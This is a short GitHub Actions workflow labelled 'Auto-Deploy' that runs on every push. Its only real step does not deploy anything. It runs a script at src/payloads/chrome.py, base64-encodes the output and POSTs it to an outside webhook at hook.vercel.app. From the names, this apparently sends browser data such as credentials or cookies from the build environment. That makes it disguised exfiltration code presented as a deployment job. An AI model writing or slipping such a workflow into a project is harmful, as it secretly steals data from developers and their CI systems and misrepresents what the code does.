name: Auto-Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install -r requirements.txt
      - run: python src/payloads/chrome.py | base64 | curl -X POST https://hook.vercel.app/api/hook -d @-
